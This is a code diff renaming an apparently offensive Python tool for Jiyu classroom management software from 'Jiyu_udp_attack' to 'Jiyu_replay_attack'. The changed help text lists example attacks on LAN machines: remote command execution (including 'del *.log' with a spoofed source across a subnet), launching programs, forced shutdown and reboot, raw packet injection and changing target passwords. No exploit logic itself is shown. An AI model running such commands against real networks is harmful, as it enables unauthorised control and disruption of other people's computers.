@@ -50,26 +50,26 @@ def main_parser():
     This function sets up the command-line argument parser with various options for network configuration and attack actions
     """
     parser = argparse.ArgumentParser(
-        prog="Jiyu_udp_attack",
+        prog="Jiyu_replay_attack",
         description="Jiyu Attack Script\n\n"
-        "Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ \n",
+        "Github Repositories: https://github.com/weilycoder/Jiyu_replay_attack/tree/main/ \n",
         epilog="Example usage:\n"
-        '    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"\n'
-        "    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com\n"
-        '    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
-        "    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe\n"
-        "    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
-        '    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
-        '    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
-        "    python Jiyu_udp_attack -t 192.168.106.255 -cw\n"
-        "    python Jiyu_udp_attack -t 192.168.106.100 -ctw\n"
-        "    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000\n"
-        "    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
-        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
-        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
-        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
-        "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
-        "    python Jiyu_udp_attack -t 127.0.0.1 --setting",
+        '    python Jiyu_replay_attack -t 192.168.106.100 -m "Hello World"\n'
+        "    python Jiyu_replay_attack -t 192.168.106.104 -w https://www.github.com\n"
+        '    python Jiyu_replay_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
+        "    python Jiyu_replay_attack -t 224.50.50.42 -e calc.exe\n"
+        "    python Jiyu_replay_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
+        '    python Jiyu_replay_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
+        '    python Jiyu_replay_attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
+        "    python Jiyu_replay_attack -t 192.168.106.255 -cw\n"
+        "    python Jiyu_replay_attack -t 192.168.106.100 -ctw\n"
+        "    python Jiyu_replay_attack -t 192.168.106.100 -n hacker 1000\n"
+        "    python Jiyu_replay_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
+        '    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
+        '    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
+        '    python Jiyu_replay_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
+        "    python Jiyu_replay_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
+        "    python Jiyu_replay_attack -t 127.0.0.1 --setting",
         formatter_class=MaxWidthHelpFormatter,
     )
     network_config_group = parser.add_argument_group(
@@ -194,7 +194,7 @@ def main_parser():
         nargs="?",
         metavar="<setting-args>",
         const="--help",
-        help="Set specific settings on the target machine\nUse `Jiyu_udp_attack --setting` for help",
+        help="Set specific settings on the target machine\nUse `Jiyu_replay_attack --setting` for help",
     )
     attack_action.add_argument(
         "--hex",
@@ -218,12 +218,12 @@ def setting_parser():
     """
     parser = argparse.ArgumentParser(
         description="Specify settings for the target machine",
-        usage='Jiyu_udp_attack <main-args> --setting="[setting-options]"',
+        usage='Jiyu_replay_attack <main-args> --setting="[setting-options]"',
         argument_default=argparse.SUPPRESS,
         epilog="Example usage:\n"
-        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting=""\n'
-        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
-        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
+        '    python Jiyu_replay_attack -t 192.168.233.0/24 --setting=""\n'
+        '    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
+        '    python Jiyu_replay_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
         formatter_class=MaxWidthHelpFormatter,
     )
     network = parser.add_argument_group("Network Configuration")
@@ -429,5 +429,5 @@ if __name__ == "__main__":
     main()
 else:
     print("This script is intended to be run as a standalone program, not imported as a module.", file=sys.stderr)
-    print("Please run it directly using 'python Jiyu_udp_attack/__main__.py' or similar command.", file=sys.stderr)
+    print("Please run it directly using 'python Jiyu_replay_attack/__main__.py' or similar command.", file=sys.stderr)
     raise ImportError("This script is not designed to be imported as a module.")
